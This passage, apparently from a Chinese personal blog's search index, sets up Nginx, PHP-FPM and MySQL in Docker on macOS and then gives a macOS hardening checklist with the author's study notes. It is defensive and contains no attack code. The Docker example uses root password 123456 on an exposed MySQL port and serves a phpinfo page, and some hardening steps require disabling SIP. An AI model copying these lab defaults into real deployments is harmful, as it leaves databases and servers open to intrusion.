295字节</td><td>极大文本数据</td></tr></tbody></table><p>CHAR 和 VARCHAR 类型类似，但它们保存和检索的方式不同。它们的最大长度和是否尾部空格被保留等方面也不同。在存储或检索过程中不进行大小写转换。</p><p>BINARY 和 VARBINARY 类似于 CHAR 和 VARCHAR，不同的是它们包含二进制字符串而不要非二进制字符串。也就是说，它们包含字节字符串而不是字符字符串。这说明它们没有字符集，并且排序和比较基于列值字节的数值值。</p><p>BLOB 是一个二进制大对象，可以容纳可变数量的数据。有 4 种 BLOB 类型：TINYBLOB、BLOB、MEDIUMBLOB 和 LONGBLOB。它们区别在于可容纳存储范围不同。</p><p>有 4 种 TEXT 类型：TINYTEXT、TEXT、MEDIUMTEXT 和 LONGTEXT。对应的这 4 种 BLOB 类型，可存储的最大长度不同，可根据实际情况选择。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Docker配置Nginx+PHP+MySQL</title>
      <link href="2019/07/22/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/"/>
      <url>2019/07/22/%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<p><strong>任务目标</strong>：准备学习环境，学习Web服务器的搭建过程，并做相应的加固学习</p><p><strong>操作系统</strong>：MacOS Catalina 10.15</p><a id="more"></a><p><strong>报告内容</strong>：</p><h2 id="为电脑安装Docker"><a href="#为电脑安装Docker" class="headerlink" title="为电脑安装Docker"></a>为电脑安装Docker</h2><p>macOS 我们可以使用 Homebrew 来安装 Docker。</p><pre><code>$ brew cask install docker</code></pre><p><img src="http://ww2.sinaimg.cn/large/006y8mN6ly1g67e4zlnb6j30uy06g0uo.jpg" alt="image-20190722111319355"></p><p>在Docker环境安装成功之后，就可以开始进行环境的配置了。</p><h1 id="Docker安装配置Nginx"><a href="#Docker安装配置Nginx" class="headerlink" title="Docker安装配置Nginx"></a>Docker安装配置Nginx</h1><p>首先需要拉取Docker Hub上的nginx镜像，我们可以使用以下命令</p><pre><code>$ docker pull nginx</code></pre><p>随后我们在Docker images里就可以看到Nginx的镜像</p><p><img src="http://ww3.sinaimg.cn/large/006y8mN6ly1g67e4y4r0rj30uy0a876m.jpg" alt="image-20190723174253192"></p><p>以下命令使用 NGINX 默认的配置来启动一个 Nginx 容器实例：</p><pre><code>$ docker run --name Fstark-nginx -p 8081:80 -d nginx</code></pre><ul><li><code>Fstark-nginx</code> 容器名称。</li><li>the <code>-d</code>设置容器在在后台一直运行。</li><li>the <code>-p</code> 端口进行映射，将本地 8081 端口映射到容器内部的 80 端口。</li></ul><p>此时我们就可以使用Docker ps命令查看容器是否真的在运行，以及其运行状态。</p><p><img src="http://ww3.sinaimg.cn/large/006y8mN6ly1g67e4xht2wj31kg03u0tx.jpg" alt="image-20190723174742160"></p><p>PORTS 部分表示端口映射，本地的 8081 端口映射到容器内部的 80 端口。</p><p>在浏览器中打开 <strong><a href="http://localhost:8081/">http://localhost:8081</a></strong>，效果如下：</p><p><img src="http://ww1.sinaimg.cn/large/006y8mN6ly1g67e4yvgzuj312508y403.jpg" alt="image-20190723175223816"></p><p>既证明nginx安装成功，随后我们要进行nginx的进一步部署。</p><p>首先，创建目录 nginx, 用于存放后面的相关东西。</p><pre><code>$ mkdir -p ~/nginx/www ~/nginx/logs ~/nginx/conf</code></pre><p>拷贝容器内 Nginx 默认配置文件到本地当前目录下的 conf 目录，容器 ID 可以查看 <strong>docker ps</strong> 命令输入中的第一列：</p><pre><code>docker cp 66e57416972d:/etc/nginx/nginx.conf ~/nginx/conf</code></pre><ul><li><strong>www</strong>: 目录将映射为 nginx 容器配置的虚拟目录。</li><li><strong>logs</strong>: 目录将映射为 nginx 容器的日志目录。</li><li><strong>conf</strong>: 目录里的配置文件将映射为 nginx 容器的配置文件。</li></ul><p>部署命令如下：</p><pre><code>$ docker run -d -p 8082:80 --name Fstark-nginx-web -v ~/nginx/www:/usr/share/nginx/html -v ~/nginx/conf/nginx.conf:/etc/nginx/nginx.conf -v ~/nginx/logs:/var/log/nginx nginx</code></pre><p>命令说明：</p><ul><li><strong>-p 8082:80：</strong> 将容器的 80 端口映射到主机的 8082 端口。</li><li><strong>–name Fstark-nginx-web：</strong>将容器命名为 Fstark-nginx-web。</li><li><strong>-v ~/nginx/www:/usr/share/nginx/html：</strong>将我们自己创建的 www 目录挂载到容器的 /usr/share/nginx/html。</li><li><strong>-v ~/nginx/conf/nginx.conf:/etc/nginx/nginx.conf：</strong>将我们自己创建的 nginx.conf 挂载到容器的 /etc/nginx/nginx.conf。</li><li><strong>-v ~/nginx/logs:/var/log/nginx：</strong>将我们自己创建的 logs 挂载到容器的 /var/log/nginx。</li></ul><p>启动以上命令后进入 ~/nginx/www 目录：</p><pre><code>$ cd ~/nginx/www</code></pre><p>创建 index.html 文件，内容如下：</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;Fstark的信安之路第一步&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;我的第一个标题&lt;/h1&gt;    &lt;p&gt;我的第一个段落。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>输出结果为：</p><p><img src="http://ww3.sinaimg.cn/large/006y8mN6ly1g67e50kc34j30q80fumym.jpg" alt="image-20190723180542509"></p><h1 id="Docker安装PHP"><a href="#Docker安装PHP" class="headerlink" title="Docker安装PHP"></a>Docker安装PHP</h1><p>查找Docker Hub上的php镜像，这里我们拉取官方的镜像,标签为5.6-fpm</p><pre><code>docker pull php:5.6-fpm</code></pre><p>等待下载完成后，我们就可以在本地镜像列表里查到REPOSITORY为php,标签为5.6-fpm的镜像。</p><p>这时就可以启动PHP了</p><pre><code>docker run --name  myphp-fpm -v ~/nginx/www:/www  -d php:5.6-fpm</code></pre><p>命令说明：</p><ul><li><strong>–name myphp-fpm</strong> : 将容器命名为 myphp-fpm。</li><li><strong>-v ~/nginx/www:/www</strong> : 将主机中项目的目录 www 挂载到容器的 /www</li></ul><p>创建 ~/nginx/conf/conf.d 目录：</p><pre><code>mkdir ~/nginx/conf/conf.d </code></pre><p>在该目录下添加 <strong>~/nginx/conf/conf.d/Fstark-php.conf</strong> 文件，内容如下：</p><pre><code>server &#123;    listen       80;    server_name  localhost;    location / &#123;        root   /usr/share/nginx/html;        index  index.html index.htm index.php;    &#125;    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        root   /usr/share/nginx/html;    &#125;    location ~ \.php$ &#123;        fastcgi_pass   php:9000;        fastcgi_index  index.php;        fastcgi_param  SCRIPT_FILENAME  /www/$fastcgi_script_name;        include        fastcgi_params;    &#125;&#125;</code></pre><p>配置文件说明：</p><ul><li><strong>php:9000</strong>: 表示 php-fpm 服务的 URL，下面会具体说明。</li><li><strong>/www/</strong>: 是 <strong>myphp-fpm</strong> 中 php 文件的存储路径，映射到本地的 ~/nginx/www 目录。</li></ul><p>启动 nginx：</p><pre><code>docker run --name Fstark-php-nginx -p 8083:80 -d \    -v ~/nginx/www:/usr/share/nginx/html:ro \    -v ~/nginx/conf/conf.d:/etc/nginx/conf.d:ro \    --link myphp-fpm:php \    nginx</code></pre><ul><li><strong>-p 8083:80</strong>: 端口映射，把 <strong>nginx</strong> 中的 80 映射到本地的 8083 端口。</li><li><strong>~/nginx/www</strong>: 是本地 html 文件的存储目录，/usr/share/nginx/html 是容器内 html 文件的存储目录。</li><li><strong>~/nginx/conf/conf.d</strong>: 是本地 nginx 配置文件的存储目录，/etc/nginx/conf.d 是容器内 nginx 配置文件的存储目录。</li><li><strong>–link myphp-fpm:php</strong>: 把 <strong>myphp-fpm</strong> 的网络并入 <strong>nginx</strong>，并通过修改 <strong>nginx</strong> 的 /etc/hosts，把域名 <strong>php</strong> 映射成 127.0.0.1，让 nginx 通过 php:9000 访问 php-fpm。</li></ul><p>接下来我们在 ~/nginx/www 目录下创建 index.php，代码如下：</p><pre><code>&lt;?phpecho phpinfo();?&gt;</code></pre><p>浏览器打开 <strong><a href="http://127.0.0.1:8083/index.php">http://127.0.0.1:8083/index.php</a></strong>，显示如下：</p><p><img src="http://ww3.sinaimg.cn/large/006y8mN6ly1g67e5218caj31pb0u0qbg.jpg" alt="image-20190725134655475"></p><p>如图可知，php配置成功。</p><h1 id="Docker安装MySQL"><a href="#Docker安装MySQL" class="headerlink" title="Docker安装MySQL"></a>Docker安装MySQL</h1><p>查找Docker Hub上的mysql镜像，这里我拉取官方的镜像,标签为5.6</p><pre><code>docker pull mysql:5.6</code></pre><p>等待下载完成后，我们就可以在本地镜像列表里查到REPOSITORY为mysql,标签为5.6的镜像。随后运行容器</p><pre><code>docker run -p 3306:3306 --name mymysql -v $PWD/conf:/etc/mysql/conf.d -v $PWD/logs:/logs -v $PWD/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.6</code></pre><p>命令说明：</p><ul><li><strong>-p 3306:3306</strong>：将容器的 3306 端口映射到主机的 3306 端口。</li><li><strong>-v $PWD/conf:/etc/mysql/conf.d</strong>：将主机当前目录下的 conf/my.cnf 挂载到容器的 /etc/mysql/my.cnf。</li><li><strong>-v $PWD/logs:/logs</strong>：将主机当前目录下的 logs 目录挂载到容器的 /logs。</li><li><strong>-v $PWD/data:/var/lib/mysql</strong> ：将主机当前目录下的data目录挂载到容器的 /var/lib/mysql 。</li><li><strong>-e MYSQL_ROOT_PASSWORD=123456：</strong>初始化 root 用户的密码。</li></ul><p><img src="http://ww4.sinaimg.cn/large/006y8mN6ly1g67e501gtgj31t2066dj1.jpg" alt="截屏2019-07-25下午2.23.07"></p><pre><code>docker run --name myadmin -d --link mymysql:db -p 8080:80 phpmyadmin/phpmyadmin</code></pre><p>此时可以连接到数据库</p><p><img src="http://ww1.sinaimg.cn/large/006y8mN6ly1g67e51492aj316y0u0afd.jpg" alt="image-20190725145426373"></p><h1 id="Macos安全加固"><a href="#Macos安全加固" class="headerlink" title="Macos安全加固"></a>Macos安全加固</h1><p>安全加固（Security Reinforce，SR）对主机、网络设备、应用系统、操作系统、中间件、数据库等进行全面的基线加固和组件升级，针对系统存在的高危漏洞和安全隐患等提供安全加固方案，整体上提高系统的安全防御能力。   我查阅了阿里云的官方安全公告和技术，嘶吼论坛里的资料以及谷歌搜索的结果，整合了Mac os操作系统的一些安全加固。</p><p><strong>(1) 安全启动</strong></p><p>在2018年以后的MacBook主机中，通过TouchBar内部新安装的T2芯片（包括Secure Enclave），支持安全启动（Secure Boot）功能。要检查是否已经启用安全启动，需要在开机时同时按下COMMAND + R键。在输入固件密码后，可以访问菜单栏中的“启动安全实用程序”（Startup Security Utility）。如果MacBook中带有T2芯片（TouchBar），则可以看到“安全启动”（Secure Boot）和“外部启动”（External Boot）两个选项。我们强烈建议，在需要保证较高安全性的情况下，应选择“安全启动”。在禁止从外部介质启动时，应选择“外部启动”。</p><p><font color=red><strong><em>这一条不太理解，因为我的电脑是2015年配置的，不含此芯片</em></strong></font> </p><p><strong>(2) 终端保护</strong></p><p>默认情况下，macOS已经具有保护机制，例如：XProtect（恶意软件检测）、Secure Boot、代码签名验证、沙箱应用程序和系统完整性保护。此外，如果启用了MDM（例如在macOS服务器上），则可以通过不同的策略配置设备和管理设备。如果需要安装其他终端保护工具，应该评估该工具是否支持macOS设备。</p><p><font color=red><strong><em>对终端进行保护，防止第三方的恶意输入。计算机使用人员离开后不会被其他人员或者黑客木马操作自己的机子，减少安全隐患。保证机密文档，只有授权用户才能访问，其他用户不经过授权无法访问和查看文件夹中的文件；</em></strong></font> </p><p><strong>(3) 日志和事件收集</strong></p><p>管理员可以根据实际需要，配置macOS的审计框架。通过/Applications/Utilities/Console.app，可以查看到整合后的日志。默认情况下，macOS支持以syslogd守护程序，通过UDP/514端口发送日志。但是，由于缺乏对TLS/SSL的支持，建议不要使用此项功能，预计Apple很快就会弃用这项功能。如果您所在的企业环境中不支持包含代理的macOS SISM，建议可以从本地整合日志，并且避免通过网络发送未经加密的日志。借助macOS提供的日志实用程序，可以以安全的方式获取此类日志，只需日志收集服务器的接收端打开TCP端口（需支持TLS/SSL）。例如，在MacBook上执行以下命令，可以通过加密通道将每个失败的sudo尝试发送到日志服务器：</p><pre><code>log stream --style syslog --predicate &#39;process == &quot;sudo&quot; and eventMessage contains &quot;incorrect password&quot;&#39; | openssl s_client -host &lt;RemoteServer&gt; -port &lt;Port&gt;</code></pre><p>日志服务器将收到类似的日志消息，如下所示：</p><pre><code>Filtering the log data using &quot;process == &quot;sudo&quot; AND composedMessage CONTAINS &quot;incorrect password&quot;&quot;Timestamp                       (process)[PID]2018-10-24 17:23:33.842651+0200  localhost sudo[2002]:   MacBook_ERNW : 2 incorrect password attempts ; TTY=ttys002 ; PWD=/Users/MacBook_ERNW ; USER=root ; COMMAND=su</code></pre><p>可以使用macOS登录项，来自动启动日志流。此外，管理员可以根据需要，使用过滤器来过滤实际需要的日志。</p><p><font color=red><strong><em>出现任何问题，可以通过日志查找根源，发现问题，进而解决问题</em></strong></font> </p><p><strong>(4) 移动设备管理</strong></p><p>将MacBook与移动设备管理系统（MDM，如macOS服务器）连接，可以强制操作系统必须部署指定的策略。此外，可以通过MDM解决方案来实现部署证书和连接到活动目录（Active Directory）。</p><p><strong>(5) 确保标准帐户和默认帐户的安全性</strong></p><p>macOS会始终强制用户创建新帐户。即使用户以管理员权限帐户运行，也不会拥有与“root”相同的权限，这就是macOS称之为系统完整性保护（SIP）的机制。SIP将拒绝使用者对系统目录（例如：/System）的任何更改。</p><p><font color=red><strong><em>防止root权限出现一些安全问题</em></strong></font> </p><p><strong>(6) 用户权限分离</strong></p><p>建议用户使用不同的帐户，分别进行管理和日常活动。并且，应该为特殊任务和系统维护创建一个具有管理员权限的帐户，为日常使用过程创建一个普通帐户，从而避免攻击者快速提升权限。</p><p><font color=red><strong><em>防止root权限出现一些安全问题</em></strong></font> </p><p><strong>(7) 确保密码安全</strong></p><p>应确保所有用户都使用强密码，强密码的具体定义如下：</p><p>最小密码长度至少为8个字符；</p><p>密码必须同时包含小写字母、大写字母、数字和特殊字符；</p><p>不得使用任何默认密码；</p><p>密码必须具有6个以上不同的字符；</p><p>同一个密码最多使用180天；</p><p>用户名不得作为密码的一部分；</p><p>新设置的密码，与最近5次设置的历史密码不能相同。</p><p><font color=red><strong><em>密码安全十分重要，房子爆破和被入库，需要及时的更换密码</em></strong></font> </p><p><strong>(8) 强制密码安全策略（重要）</strong></p><p>管理员可以使用命令行工具pwpolicy，来强制实施密码策略。以下命令可以强制执行上述策略：</p><pre><code>pwpolicy -u -setpolicy &quot;minChars=8 requiresAlpha=1 requiresNumeric=1 maxMinutesUntilChangePassword=259200 usingHistory=5 usingExpirationDate=1 passwordCannotBeName=1 requiresMixedCase=1 requiresSymbol=1&quot;</code></pre><p><font color=red><strong><em>强制使用密码，虽然麻烦，但是增强了安全性</em></strong></font> </p><p><strong>(9) 双因素身份验证（可选）</strong></p><p>从macOS 10.11和iOS 9开始，这些Apple设备就内置了双因素身份验证机制，可以保护用户的Apple ID。如果访问了任何需要登录Apple ID的内容，身份验证码就会被推送到另一台安装了macOS 10.11以上版本或iOS 9以上版本系统的设备上。这一过程可能会影响用户的macOS安装，因为可以通过Apple ID重置设备的密码。如果用户需要使用Apple ID执行各种任务，那么建议使用双因素身份验证。</p><p><font color=red><strong><em>两步验证，大大增强了ID的安全性</em></strong></font> </p><p><strong>(10) 自动登录和用户列表（重要）</strong></p><p>在“系统偏好设置”（System Perferences）中，选择“用户和组”（Users &amp; Groups），选择“登录选项”（Login Options），将“自动登录”（Automatic Login）设置为禁用，将“显示登录窗口”（Display Login Window）设置为“用户名和密码”（Name and Password），并禁用密码提示（Password Hints）。</p><p><font color=red><strong><em>禁用用户列表，这样会降低攻击者正确猜测登录凭据的可能性</em></strong></font> </p><p><strong>(11) 登录导语（可选）</strong></p><p>可以设置登录导语（Login Banner），从而在登录时显示包含策略的信息。</p><pre><code>sudo defaults write /Library/Preferences/com.apple.loginwindow LoginwindowText “text”</code></pre><p><font color=red><strong><em>起到提示性的作用</em></strong></font> </p><p><strong>(12) 访客帐户（重要）</strong></p><p>应该始终禁用访客帐户的所有内容，并且停用访客账户。</p><p>在“系统偏好设置”中，选择“用户和组”，确保已经禁用访客账户（Guest Users）。</p><p><font color=red><strong><em>停用访客访问，减小被侵入进而提权的风险</em></strong></font> </p><p><strong>(13) 限制Sudoers文件（重要）</strong></p><p>要限制宽限期（Grace Period）并限制为单个ttys，应使用visudo命令，编辑/etc/sudoers，添加以下内容：</p><pre><code>Defaults timestamp_timeout=0Defaults tty_tickets</code></pre><p><strong>(14) 自动锁定登录钥匙串（可选）</strong></p><p>打开钥匙串访问（Keychain Access），选择登录钥匙串。选择“编辑”（Edit），更改钥匙串设置“登录”。将“不活动[…]分钟后锁定”（Lock after […] minutes）的数值设置为10。勾选“睡眠时锁定”（Lock when sleeping）选项。</p><p>注意：自动锁定钥匙串将会影响用户体验，每个锁定守护进程（例如：Wi-Fi服务）都需要解锁。因此，Wi-Fi环境下的自动夜间备份将会受到影响。</p><p><font color=red><strong><em>登录钥匙串，许多登录窗口会自动填充密码，对用户十分危险</em></strong></font> </p><p><strong>(15) 修复当前系统漏洞（重要）</strong></p><p>在执行本指南中的加固措施之前，强烈建议先将当前系统升级到最新且已经安装补丁的状态。可以通过“Apple菜单” – “App Store” – “升级”（Updates）来检查当前系统的更新情况。</p><p>或者，也可以在命令行中输入以下命令：</p><pre><code>$ softwareupdate -l</code></pre><p><font color=red><strong><em>及时升级系统，修补漏洞，十分重要</em></strong></font> </p><p><strong>(16) 自动更新（重要）</strong></p><p>建议始终启用自动更新，以自动向系统提供最新的安全修复程序。可以通过以下命令检查是否启用此设置：</p><pre><code>$ defaults read /Library/Preferences/com.apple.SoftwareUpdate AutomaticallyInstallMacOSUpdates1</code></pre><p>如果启用了自动更新，则返回值应该为1，如上面输出所示。如果该设置不存在，可以通过以下命令来手动设置：</p><pre><code>sudo defaults write /Library/Preferences/com.apple.SoftwareUpdate AutomaticallyInstallMacOSUpdates -int 1</code></pre><p><font color=red><strong><em>自动更新，修补漏洞</em></strong></font> </p><p><strong>(17) Gatekeeper（重要）</strong></p><p>Gatekeeper将检查应用程序是否使用有效的Apple证书进行签名。通过以下方式来检查应用程序是否具有签名：</p><pre><code>spctl –a /Applications/test.app</code></pre><p>如果要将其添加到Gatekeeper，可以使用如下命令：</p><pre><code>spctl --add test.app</code></pre><p>或者直接执行下面的操作：</p><p>右键单击，选择“打开”。</p><p>注意：在一些情况下，系统可能仍然会拒绝打开应用程序。这时，我们可以强行启动：</p><p>点击“系统偏好设置”，选择“安全和隐私”（Security &amp; Privacy），选择“常规”（General）。然后打开应用程序。</p><p><font color=red><strong><em>安装程序时，验证签名，提高安装软件的安全性</em></strong></font> </p><p><strong>(18) 执行代码签名机制（重要）</strong></p><p>可以编辑/etc/sysctl.conf，在其中添加以下行：</p><pre><code>vm.cs_force_kill=1  # Kill process if invalidatedvm.cs_force_hard=1  # Fail operation if invalidatedvm.cs_all_vnodes=1  # Apply on all Vnodesvm.cs_enforcement=1 # Globally apply code signing enforcement</code></pre><p>注意：此项更改需要禁用系统完整性保护，在加固后请手动启用。在新安装的系统上，sysctl.conf可能不存在，管理员可以创建该文件并重新启动系统。</p><p><strong>(19) 禁用元数据文件创建（重要）</strong></p><p>建议禁止在macOS在远程卷（例如：网络存储、USB存储）上创建临时文件。下面的命令可以阻止此类行为：</p><pre><code>defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool truedefaults write com.apple.desktopservices DSDontWriteUSBStores -bool true</code></pre><p><font color=red><strong><em>防止入侵者创建一些不好的东西</em></strong></font> </p><p><strong>(20) 禁用保存到iCloud（重要）</strong></p><p>以下命令可以阻止macOS将文件直接保存到任何iCloud服务器：</p><pre><code>sudo defaults write NSGlobalDomain NSDocumentSaveNewDocumentsToCloud -bool false</code></pre><p><font color=red><strong><em>防止对数据构成威胁</em></strong></font> </p><p><strong>(21) 禁用诊断（重要）</strong></p><p>要避免向Apple或App Developers发送数据，请禁用以下内容：</p><p>在“系统偏好设置”中，选择“安全和隐私”，选择“隐私”（Privacy），选择“诊断和使用”（Diagnostics &amp; Usage）。取消选中“向Apple发送诊断和使用数据”（Send diagnostic &amp; usage data to Apple），取消选中“与应用开发者共享崩溃数据”（Share crash data with app developers）。</p><p><font color=red><strong><em>禁止发送数据给开发者，防止数据泄露</em></strong></font> </p><p><strong>(22) 禁用Handoff（重要）</strong></p><p>Apple Handoff是一项保持工作区同步的功能，但该功能需要向Apple发送数据，建议禁用这一功能。</p><p>在“系统首选项”（System Preferences）中，选择“常规”（General），取消选中“允许在此Mac和iCloud设备之间切换”（Allow Handoff between this Mac and your iCloud devices），并将“最近项目”设置为“无”（None）。</p><p><font color=red><strong><em>禁止发送无必要的数据</em></strong></font> </p><p><strong>(23) FileVault（重要）</strong></p><p>建议启动FileVault，以在设备上启用完整磁盘加密。该功能应该已经默认启用。但是，在安装macOS之后再打开FileVault会更加安全，因为此时的伪随机数生成器会具有更加随机的种子。</p><p>点击“系统偏好设置” – “安全和隐私” – “FileVault”，选择“启用FileVault”。</p><p>*可选设置：</p><p>如果要在休眠时，从内存中删除加密密钥，并从内存中断电，可以使用以下命令：</p><pre><code>sudo pmset -a destroyfvkeyonstandby 1 hibernatemode 25</code></pre><p>注意：这项操作可能会对用户体验产生影响，因为必须要在每次合盖/开盖后解密磁盘。因此，启动过程最多可能需要10秒钟时间。我们建议对安全性要求较高的计算机设置此选项，其首选设置如下：</p><pre><code>sudo pmset -a powernap 0sudo pmset -a standby 0sudo pmset -a standbydelay 0sudo pmset -a autopoweroff 0</code></pre><p><font color=red><strong><em>启用完整的数据加密，大大增加安全性</em></strong></font> </p><p><strong>(24) 防火墙（重要）</strong></p><p>建议启用具有完整功能的防火墙，并阻止所有传入流量。</p><p>点击“系统偏好设置” – “安全和隐私” – “防火墙”，点击“打开防火墙”（Turn on Firewall）。选择“防火墙选项”（Firewall Options），设置“阻止所有传入连接”（Block All Incoming Connections），设置“启用隐身模式”（Enable Stealth Mode）。</p><p><font color=red><strong><em>启用防火墙，增强安全性</em></strong></font> </p><p><strong>(25) 需要管理员密码（重要）</strong></p><p>建议始终要求在验证管理员密码后才能访问系统设置。</p><p><font color=red><strong><em>root权限账号一定要加强管理</em></strong></font> </p><p><strong>(26) 屏幕保护程序和解锁（重要）</strong></p><p>建议在不活动时，自动锁定屏幕。</p><p>点击“系统偏好设置” – “桌面和屏幕保护程序”（Desktop &amp; Screensaver） – “屏幕保护程序”（Screensaver）。根据需要调整时间范围，我们建议将其设置为5分钟。</p><p>点击“系统偏好设置” – “安全和隐私” – “常规”，设置“睡眠或屏幕保护程序开始后立即需要密码”（Require password immediately after sleep or screen saver begins）。</p><p><font color=red><strong><em>防止主人离开时，有人不经允许使用</em></strong></font> </p><p><strong>(27) 文件扩展名（重要）</strong></p><p>要始终掌握用户正在处理的文件类型，建议开启显示文件扩展名。</p><p>打开“访达”（Finder），选择“设置”（Settings） – “高级”（Advanced），选择“显示所有文件扩展名”（Show all filename extensions）。</p><p><font color=red><strong><em>显示文件扩展名</em></strong></font> </p><p><strong>(28) 阻止Safari打开已知类型文件（重要）</strong></p><p>如果用户使用Safari作为主要的浏览器，建议阻止Safari在下载文件后打开已知文件类型的文件。</p><p>打开Safari，选择“首选项”（Preferences），选择“常规”（General），取消“下载后打开安全文件”（Open safe files after downloading）。</p><p><font color=red><strong><em>文件不要直接打开，要经过安全性的验证</em></strong></font> </p><p><strong>(29) 设置严格的全局Umask（可选）</strong></p><p>严格限制全局Umask默认使用用户将来创建的任何文件或目录的权限。我们可以使用以下命令来调整全局Umask：</p><pre><code>sudo launchctl config system umask 027</code></pre><p>注意：这可能会破坏依赖于较少限制的umask的其他软件安装。</p><p><font color=red><strong><em>控制权限</em></strong></font> </p><p><strong>(30) 禁用远程Apple事件（重要）</strong></p><p>建议禁用远程Apple事件服务（默认禁用）。该服务可用于通过网络对另一台Mac上的软件执行操作。因此，它应该始终被禁用。下面的命令可以检查是否启用了远程Apple事件：</p><pre><code>sudo systemsetup –getremoteappleevents</code></pre><p>应确保输出为：</p><p>Remote Apple Events: Off</p><p>如果启用，那么可以使用以下命令来禁用：</p><pre><code>sudo systemsetup -setremoteappleevents off</code></pre><p><font color=red><strong><em>防止通过漏洞远程控制电脑</em></strong></font> </p><p><strong>(31) 禁用蓝牙（可选）</strong></p><p>由于此前存在一些针对蓝牙配对和身份检测的攻击方法，因此建议在不需要使用蓝牙时禁用蓝牙。</p><p>点击“系统偏好设置” – “蓝牙”（Bluetooth），选择“停用蓝牙”（Deactivate Bluetooth）。</p><p>注意：取消激活蓝牙，将会断开蓝牙键盘、蓝牙鼠标或蓝牙耳机等外接设备。</p><p><font color=red><strong><em>非必要时禁止使用蓝牙</em></strong></font> </p><p><strong>(32) 固件密码（重要）</strong></p><p>要防止单用户模式（Single User Mode）和可引导设备，建议设置足够复杂的固件密码。</p><p>在Mac启动时，按下Command + R，将Mac启动到恢复模式（Recovery Mode）。选择“实用程序”（Utilities） – “固件密码实用程序”（Firmware Password Utility），然后设置一个足够复杂的密码。</p><p>注意：忘记此密码，可能会导致Mac完全不可用，并阻止计算机起动因此，存储该密码的密码管理器是一个有效的解决方案。此外，无论MacBook的实际键盘布局如何，当尝试访问固件安全组件时，将始终映射英语的默认设置。</p><p><font color=red><strong><em>固件密码会大大增加安全性</em></strong></font> </p><p><strong>(33) Setuid和Setgid（可选）</strong></p><p>改变二进制文件的Setuid位，是比较重要的一个设置。这可能会影响这些二进制文件的功能，但管理员始终可以撤销这些步骤。使用以下命令，可以获取所有SUID二进制文件的列表：</p><pre><code>sudo find / -perm -04000 -lssudo find / -perm -02000 –ls</code></pre><p>在这里，过滤掉我们认为“代码质量较差”或通常不信任的应用程序（例如：鼠标外接设备驱动程序）。以下命令可以取消设置文件和目录的描述权限：</p><pre><code>chmod u-s #filechmod g-s #file</code></pre><p><strong>(34) 禁用核心转储（重要）</strong></p><p>要限制内核信息泄露，请禁用核心转储功能。可以编辑/etc/sysctl.conf中的以下行：</p><pre><code>kern.coredump=0</code></pre><p>注意：此项更改需要禁用系统完整性保护，在加固后请手动启用。在新安装的系统上，sysctl.conf可能不存在，管理员可以创建该文件并重新启动系统。</p><p>由于Kerneldumps可以帮助进行调试，因此可以暂时启用：</p><pre><code>sudo sysctl -w kern.coredump=1</code></pre><p><font color=red><strong><em>核心位置不应该随意开启权限，防止内核信息泄露</em></strong></font> </p><p><strong>(35) 禁用USB/蓝牙和其他大容量存储设备（可选）</strong></p><p>在某些情况下，需要禁用将任何大容量存储插入系统。这一点可以通过删除KEXT驱动程序或使用企业级MDM工具来实现。</p><p>要完全禁用USB大容量存储设备，可以删除/System/Library/Extensions中的KEXT驱动程序IOUSBMassStorageClass.kext（必须禁用SIP）。也可以通过删除前面所提到的文件夹中的IOBlueToothFamily来完全禁用蓝牙。删除KEXT驱动程序后，需要在目录上执行以下命令，以重建kernelcache：</p><pre><code>touch /System/Library/Extensions</code></pre><p>注意：由于无法插入大容量存储设备，可能会影响MacBook的可用性。但是，USB键盘仍然有效。</p><p>此外，一些商业软件（例如：<a href="https://www.endpointprotector.com/products/endpoint-protector%EF%BC%89%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E7%B1%BB%E4%BC%BC%E7%9A%84%E7%AB%AF%E5%8F%A3%E9%98%BB%E6%AD%A2%EF%BC%8C%E4%BD%86%E6%88%91%E4%BB%AC%E8%BF%98%E6%B2%A1%E6%9C%89%E5%AF%B9%E5%85%B6%E8%BF%9B%E8%A1%8C%E8%BF%87%E4%BB%BB%E4%BD%95%E6%B5%8B%E8%AF%95%E3%80%82">https://www.endpointprotector.com/products/endpoint-protector）可以执行类似的端口阻止，但我们还没有对其进行过任何测试。</a></p><p><font color=red><strong><em>必要时，防止大容量的存储设备</em></strong></font> </p><p><strong>(36) 高级防火墙（可选）</strong></p><p>建议管理员更加准确地监控应用了就溜。软件防火墙可以为不同位置和不同网络生成自己的规则集。我们推荐一个更高级的防火墙，例如“Little Snitch”、“Radio Silence”和“Handoff”，这些都是完全成熟的本地防火墙（收费）。如果管理员希望使用免费的防火墙，可以查看精简版的“Murus”。</p><p><strong>·</strong> <a href="https://www.obdev.at/products/littlesnitch/index-de.html">https://www.obdev.at/products/littlesnitch/index-de.html</a></p><p><strong>·</strong> <a href="https://www.oneperiodic.com/products/handsoff/">https://www.oneperiodic.com/products/handsoff/</a></p><p><strong>·</strong> <a href="https://radiosilenceapp.com/">https://radiosilenceapp.com/</a></p><p><strong>·</strong> <a href="http://www.murusfirewall.com/">http://www.murusfirewall.com/</a></p><p><font color=red><strong><em>使用高级防火墙，进一步提高安全性</em></strong></font> </p><p><strong>(37) 禁用LAN唤醒（重要）</strong></p><p>选择“系统偏好设置” – “节能”（Energy Saver），取消“网络访问唤醒”（Wake for network access）。</p><p><font color=red><strong><em>防止网络唤醒，防止恶意唤醒</em></strong></font> </p><p><strong>(38) 禁用Apple文件协议AFP（重要）</strong></p><p>这一协议相当于SMB协议，在macOS 10.11上默认被禁用。管理员可以在以下位置进行验证：</p><p>选择“系统偏好设置” – “共享”（Sharing），选择“文件共享”（File Sharing） – “选项”（Options），取消设置“使用AFP共享文件和文件夹”（Share Files and folders using AFP）。</p><p>注意：也可以通过命令行实现禁用：</p><pre><code>sudo launchctl unload -w /System/Library/LaunchAgents/AppleFileServer.plist</code></pre><p><font color=red><strong><em>减少使用共享性的功能，有信息泄露的风险</em></strong></font> 